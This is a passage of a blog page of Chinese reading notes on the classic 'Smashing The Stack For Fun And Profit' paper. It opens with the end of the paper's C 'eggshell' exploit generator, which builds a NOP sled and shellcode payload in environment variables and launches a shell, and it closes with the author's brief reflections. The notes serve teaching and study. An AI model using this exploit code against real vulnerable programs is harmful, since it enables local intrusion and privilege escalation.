+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    
+	<span class=n>addr</span> <span class=o>=</span> <span class=n>get_sp</span><span class=p>()</span> <span class=o>-</span> <span class=n>offset</span><span class=p>;</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[ Buffer size:</span><span class=se>\t</span><span class=s>%d</span><span class=se>\t\t</span><span class=s>Egg size:</span><span class=se>\t</span><span class=s>%d</span><span class=se>\t</span><span class=s>Aligment:</span><span class=se>\t</span><span class=s>%d</span><span class=se>\t</span><span class=s>]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bsize</span><span class=p>,</span> <span class=n>eggsize</span><span class=p>,</span> <span class=n>align</span><span class=p>);</span>
+	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;[ Address:</span><span class=se>\t</span><span class=s>0x%x</span><span class=se>\t</span><span class=s>Offset:</span><span class=se>\t\t</span><span class=s>%d</span><span class=se>\t\t\t\t</span><span class=s>]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>offset</span><span class=p>);</span>
+    
+    <span class=n>addr_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)</span> <span class=n>bof</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>bsize</span><span class=p>;</span> <span class=n>i</span><span class=o>+=</span><span class=mi>4</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>addr_ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>addr</span><span class=p>;</span>
+    
+    <span class=n>ptr</span> <span class=o>=</span> <span class=n>egg</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>eggsize</span> <span class=o>-</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span> <span class=o>-</span> <span class=n>NOP_SIZE</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=n>NOP_SIZE</span><span class=p>)</span>
+        <span class=k>for</span> <span class=p>(</span><span class=n>n</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>n</span> <span class=o>&lt;</span> <span class=n>NOP_SIZE</span><span class=p>;</span> <span class=n>n</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+            <span class=n>m</span> <span class=o>=</span> <span class=p>(</span><span class=n>n</span> <span class=o>+</span> <span class=n>align</span><span class=p>)</span> <span class=o>%</span> <span class=n>NOP_SIZE</span><span class=p>;</span>
+            <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>nop</span><span class=p>[</span><span class=n>m</span><span class=p>];</span>
+        <span class=p>}</span>
+    
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
+    
+    <span class=n>bof</span><span class=p>[</span><span class=n>bsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+    <span class=n>egg</span><span class=p>[</span><span class=n>eggsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>egg</span><span class=p>,</span><span class=s>&#34;EGG=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>egg</span><span class=p>);</span>
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>bof</span><span class=p>,</span><span class=s>&#34;BOF=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>bof</span><span class=p>);</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+    <span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span>
+                  <span class=s>&#34;usage: eggshell [-a ] [-b ] [-e ] [-o ]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><hr><h4 id=读后感><a href=#读后感 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>读后感</h4><p>阅读这篇论文只要有一丁点汇编知识和操作系统的内存相关的知识</p><p>感觉这篇论文以最简洁的语言讲述了缓冲区溢出到底是如何工作的，从零开始演示了shellcode是如何产生的，如何将shellcode放入缓冲区，如何去优化shellcode（虽然现在都用metasploit生成了）。</p><p>这篇论文从提出问题到解决问题都感觉阐述的十分清晰，如果想要快速了解栈溢出的话，还是可以直接参考ctf-wki中的<a href=https://ctf-wiki.org/pwn/linux/stackoverflow/stackoverflow-basic/ target=_blank rel=noopener>stackoverflow入门</a></p></div><ul class=post-copyright><li class="copyright-item author"><span class=copyright-item-text>作者</span>：<a href=https://magic-king.net/ class="p-author h-card" target=_blank rel=noopener>Magic</a></li><li class="copyright-item link"><span class=copyright-item-text>链接</span>：<a href=/posts/reading-note-of-smashing-the-stack-for-fun/ target=_blank rel=noopener>https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/</a></li><li class="copyright-item license"><span class=copyright-item-text>许可</span>：<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a></li></ul></article><div class=updated-badge-container><span title="Updated @ 2021-02-25 14:01:04 UTC" style=cursor:help><svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2021-02-25</text><text x="915" y="140" textLength="650" transform="scale(.1)">2021-02-25</text></g></svg></span></div><div class=post-share><div class=share-items><div class="share-item twitter"><a href="https://twitter.com/share?url=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&text=Reading-Note-of-Smashing-The-Stack-For-Fun&hashtags=thesis,studyNote,&via=%25!s%28%3cnil%3e%29" title=分享到「Twitter」 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon twitter-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a></div><div class="share-item facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&hashtag=%23thesis" title=分享到「Facebook」 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon facebook-icon"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg></a></div><div class="share-item telegram"><a href="https://t.me/share/url?url=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&text=Reading-Note-of-Smashing-The-Stack-For-Fun" title=分享到「Telegram」 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon telegram-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/></svg></a></div><div class="share-item weibo"><a href="https://service.weibo.com/share/share.php?&url=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&title=Reading-Note-of-Smashing-The-Stack-For-Fun&pic=https://magic-king.net/Fig.1_Process_Memory_Regions.png&searchPic=false" title=分享到「新浪微博」 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon weibo-icon"><path d="M407 177.6c7.6-24-13.4-46.8-37.4-41.7-22 4.8-28.8-28.1-7.1-32.8 50.1-10.9 92.3 37.1 76.5 84.8-6.8 21.2-38.8 10.8-32-10.3zM214.8 446.7C108.5 446.7.0 395.3.0 310.4c0-44.3 28-95.4 76.3-143.7C176 67 279.5 65.8 249.9 161c-4 13.1 12.3 5.7 12.3 6 79.5-33.6 140.5-16.8 114 51.4-3.7 9.4 1.1 10.9 8.3 13.1 135.7 42.3 34.8 215.2-169.7 215.2zm143.7-146.3c-5.4-55.7-78.5-94-163.4-85.7-84.8 8.6-148.8 60.3-143.4 116s78.5 94 163.4 85.7c84.8-8.6 148.8-60.3 143.4-116zM347.9 35.1c-25.9 5.6-16.8 43.7 8.3 38.3 72.3-15.2 134.8 52.8 111.7 124-7.4 24.2 29.1 37 37.4 12 31.9-99.8-55.1-195.9-157.4-174.3zm-78.5 311c-17.1 38.8-66.8 60-109.1 46.3-40.8-13.1-58-53.4-40.3-89.7 17.7-35.4 63.1-55.4 103.4-45.1 42 10.8 63.1 50.2 46 88.5zm-86.3-30c-12.9-5.4-30 .3-38 12.9-8.3 12.9-4.3 28 8.6 34 13.1 6 30.8.3 39.1-12.9 8-13.1 3.7-28.3-9.7-34zm32.6-13.4c-5.1-1.7-11.4.6-14.3 5.4-2.9 5.1-1.4 10.6 3.7 12.9 5.1 2 11.7-.3 14.6-5.4 2.8-5.2 1.1-10.9-4-12.9z"/></svg></a></div><div class="share-item qq"><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&title=Reading-Note-of-Smashing-The-Stack-For-Fun&summary=%e8%ae%ba%e6%96%87%e9%98%85%e8%af%bb%e7%ac%94%e8%ae%b0%ef%bc%9aSmashing%20The%20Stack%20For%20Fun%20And%20Profit%20%e5%8e%9f%e6%96%87%ef%bc%9aSmashing%20The%20Stack%20For%20Fun%20And%20Profit%20%e5%ba%8f%20%e5%9c%a8C%e7%bc%96%e2%80%a6%e2%80%a6&pics=https://magic-king.net/Fig.1_Process_Memory_Regions.png&site=Magic%27s%20Blog" title=分享到「QQ」 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qq-icon"><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741.0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792.0.0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704z"/></svg></a></div><div class="share-item qzone"><a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/&title=Reading-Note-of-Smashing-The-Stack-For-Fun&summary=%e8%ae%ba%e6%96%87%e9%98%85%e8%af%bb%e7%ac%94%e8%ae%b0%ef%bc%9aSmashing%20The%20Stack%20For%20Fun%20And%20Profit%20%e5%8e%9f%e6%96%87%ef%bc%9aSmashing%20The%20Stack%20For%20Fun%20And%20Profit%20%e5%ba%8f%20%e5%9c%a8C%e7%bc%96%e2%80%a6%e2%80%a6&pics=https://magic-king.net/Fig.1_Process_Memory_Regions.png&site=Magic%27s%20Blog" title="分享到「QQ 空间」" target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon qzone-icon"><path d="M23.985 9.202c-.032-.099-.127-.223-.334-.258-.207-.036-7.351-1.406-7.351-1.406s-.105-.022-.198-.07c-.092-.047-.127-.167-.127-.167S12.447.956 12.349.77C12.25.583 12.104.532 12 .532s-.251.051-.349.238c-.098.186-3.626 6.531-3.626 6.531s-.035.12-.128.167c-.092.047-.197.07-.197.07S.556 8.908.348 8.943c-.208.036-.302.16-.333.258a.477.477.0 00.125.449l5.362 5.49s.072.08.119.172c.016.104.005.21.005.21s-1.189 7.242-1.22 7.45.075.369.159.43c.083.062.233.106.421.013.189-.093 6.812-3.261 6.812-3.261s.098-.044.201-.061.201.061.201.061 6.623 3.168 6.812 3.261c.188.094.338.049.421-.013a.463.463.0 00.159-.43c-.021-.14-.93-5.677-.93-5.677.876-.54 1.425-1.039 1.849-1.747-2.594.969-6.006 1.717-9.415 1.866-.915.041-2.41.097-3.473-.015-.678-.071-1.17-.144-1.243-.438-.053-.215.054-.46.545-.831a2640.5 2640.5.0 012.861-2.155c1.285-.968 3.559-2.47 3.559-2.731.0-.285-2.144-.781-4.037-.781-1.945.0-2.275.132-2.811.168-.488.034-.769.005-.804-.138-.06-.248.183-.389.588-.568.709-.314 1.86-.594 1.984-.626.194-.052 3.082-.805 5.618-.535 1.318.14 3.244.668 3.244 1.276.0.342-1.721 1.494-3.225 2.597-1.149.843-2.217 1.561-2.217 1.688.0.342 3.533 1.241 6.689 1.01l.003-.022c.048-.092.119-.172.119-.172l5.362-5.49a.477.477.0 00.127-.449z"/></svg></a></div><div class="share-item qrcode"><div class=qrcode-container title=通过「二维码」><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qrcode-icon"><path d="M0 224h192V32H0v192zM64 96h64v64H64V96zm192-64v192h192V32H256zm128 128h-64V96h64v64zM0 480h192V288H0v192zm64-128h64v64H64v-64zm352-64h32v128h-96v-32h-32v96h-64V288h96v32h64v-32zm0 160h32v32h-32v-32zm-64 0h32v32h-32v-32z"/></svg><div id=qrcode-img></div></div><script src=https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js></script><script>var typeNumber=0,errorCorrectionLevel='L',qr=qrcode(typeNumber,errorCorrectionLevel);qr.addData('https://magic-king.net/posts/reading-note-of-smashing-the-stack-for-fun/'),qr.make(),document.getElementById('qrcode-img').innerHTML=qr.createImgTag()</script></div></div></div><div class=related-posts><h2 class=related-title>相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6.0-12-5.4-12-12v-92h-92c-6.6.0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6.0 12 5.4 12 12v92h92c6.6.0 12 5.4 12 12v56z"/></svg></h2><ul class=related-list><li class=related-item><a href=/posts/reading-note-of-a-mathematical-theory-of-communication/ class=related-link>Reading-Note-of-A-Mathematical-Theory-of-Communication</a></li><li class=related-item><a href=/posts/security-protocols-and-standards/ class=related-link>Security-Protocols-and-Standards</a></li><li class=related-item><a href=/posts/database-system/ class=related-link>Database-System</a></li><li class=related-item><a href=/posts/blockchain/ class=related-link>BlockChain</a></li><li class=related-item><a href=/posts/compiler/ class=related-link>Compiler</a></li></ul></div><div class=post-tags><a href=/tags/thesis/ rel=tag class=post-tags-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49.0 48 0h204.118a48 48 0 0133.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137.0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882.0L14.059 286.059A48 48 0 010 252.118zM112 64c-26.51.0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>thesis</a>
+<a href=/tags/studynote/ rel=tag class=post-tags-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49.0 48 0h204.118a48 48 0 0133.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137.0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882.0L14.059 286.059A48 48 0 010 252.118zM112 64c-26.51.0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>studyNote</a></div><ul class=post-nav><li class=post-nav-next><a href=/posts/hexo2hugo/ rel=next>Hexo2hugo ></a></li></ul></div></main><div id=back-to-top class=back-to-top><a href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a></div><footer id=footer class=footer><div class=footer-inner><div class=site-info>©&nbsp;2021–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3.0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Magic</div><div class=powered-by>Powered by <a href=https://github.com/gohugoio/hugo target=_blank rel=noopener>Hugo</a> | Theme is <a href=https://github.com/reuixiy/hugo-theme-meme target=_blank rel=noopener>MemE</a></div><div class=site-copyright><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a></div><div class=busuanzi-site-uv-and-pv><span id=busuanzi_container_site_uv>本站访客数&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon busuanzi-site-uv"><path d="M224 256c70.7.0 128-57.3 128-128S294.7.0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2.0 422.4V464c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>&nbsp;<span id=busuanzi_value_site_uv></span></span>&nbsp;|&nbsp;<span id=busuanzi_container_site_pv>本站访问量&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon busuanzi-site-pv"><path d="M288 144a110.94 110.94.0 00-31.24 5 55.4 55.4.0 017.24 27 56 56 0 01-56 56 55.4 55.4.0 01-27-7.24A111.71 111.71.0 10288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35.0 000 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35.0 000-29.19zM288 4e2c-98.65.0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 4e2 288 4e2z"/></svg>&nbsp;<span id=busuanzi_value_site_pv></span></span></div><ul class=socials><li class=socials-item><a href=/rss.xml target=_blank rel="external noopener" title=RSS><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8.0 4.8V0c13.165.0 24 10.835 24 24h-4.801zM3.291 17.415c1.814.0 3.293 1.479 3.293 3.295.0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526.0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727.0 15.909 7.184 15.909 15.91z"/></svg></a></li><li class=socials-item><a href=mailto:ma9icking@gmail.com target=_blank rel="external noopener" title=Email><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 4e2V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V4e2H48z"/></svg></a></li><li class=socials-item><a href=https://github.com/Magic-King target=_blank rel="external noopener" title=GitHub><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63.0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577.0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93.0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176.0.0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22.0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22.0 1.606-.015 2.896-.015 3.286.0.315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a></li></ul></div></footer></div><script>typeof MathJax=='undefined'?(window.MathJax={loader:{load:['[tex]/mhchem']},tex:{inlineMath:{'[+]':[['$','$']]},tags:'ams',packages:{'[+]':['mhchem']}}},function(){var a=document.createElement('script');a.src='https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js',a.defer=!0,document.head.appendChild(a)}()):(MathJax.texReset(),MathJax.typeset())</script><script src=https://cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js></script><script>let mermaidConfig={startOnLoad:!0,flowchart:{useMaxWidth:!1,htmlLabels:!0},theme:'default'};mermaid.initialize(mermaidConfig)</script><script src=https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js></script><script>mediumZoom(document.querySelectorAll('div.post-body img'),{background:'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'})</script><script src=https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js type=module defer></script><script async src=https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script></body></html>
